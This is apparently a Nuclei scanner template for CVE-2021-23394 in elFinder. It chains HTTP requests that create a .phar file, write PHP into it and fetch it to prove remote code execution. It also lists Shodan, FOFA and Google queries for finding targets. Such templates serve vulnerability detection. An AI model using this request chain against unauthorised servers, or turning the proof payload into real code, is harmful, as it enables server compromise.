http:
- extractors:
  - internal: true
    json:
    - .added[0].hash
    name: hash
    part: body
    type: json
  matchers:
  - condition: and
    dsl:
    - contains_all(body, 'isowner', 'createext', 'added')
    - contains(content_type, 'application/json')
    - status_code == 200
    internal: true
    type: dsl
  raw:
  - 'GET /elFinder/php/connector.minimal.php?cmd=mkfile&target=l1_Lw&name={{filename}}.phar
    HTTP/1.1

    Host: {{Hostname}}

    Accept: application/json

    '
- matchers:
  - condition: and
    dsl:
    - contains_all(body, 'isowner', 'phash', 'changed')
    - contains(content_type, 'application/json')
    - status_code == 200
    internal: true
    type: dsl
  raw:
  - 'GET /elFinder/php/connector.minimal.php?cmd=put&target={{hash}}&content=<?='''';+echo+md5(''{{payload_str}}'');+?>
    HTTP/1.1

    Host: {{Hostname}}

    Accept: application/json

    '
- matchers:
  - part: body
    type: word
    words:
    - '{{md5(payload_str)}}'
  raw:
  - 'GET /elFinder/files/{{filename}}.phar HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2021-23394
info:
  author: 0xanis
  classification:
    cpe: cpe:2.3:a:std42:elfinder:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-23394
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.1
    cwe-id: CWE-434
    epss-percentile: 0.98933
    epss-score: 0.77529
  description: 'studio-42/elfinder before 2.1.58 contains a remote code execution
    caused by execution of PHP code in a .phar file, letting attackers execute arbitrary
    PHP code if the server parses .phar files as PHP, exploit requires server to parse
    .phar files as PHP.

    '
  impact: 'Attackers can execute arbitrary PHP code on the server, potentially leading
    to full server compromise.

    '
  metadata:
    fofa-query: title="elfinder"
    google-query: intitle:"elfinder"
    max-request: 3
    product: elfinder
    shodan-query: http.title:"elfinder"
    vendor: std42
    verified: true
  name: elFinder < 2.1.58 - Remote Code Execution
  reference:
  - https://github.com/Studio-42/elFinder/issues/3295
  - https://blog.sonarsource.com/elfinder-the-story-of-a-file-manager-and-a-bunch-of-vulnerabilities
  - https://snyk.io/vuln/SNYK-PHP-STUDIO42ELFINDER-1290554
  - https://nvd.nist.gov/vuln/detail/CVE-2021-23394
  remediation: 'Update to version 2.1.58 or later.

    '
  severity: high
  tags: cve,cve2021,elfinder,rce,phar,file-upload,intrusive,vkev
variables:
  filename: '{{randstr}}'
  payload_str: '{{randstr}}'
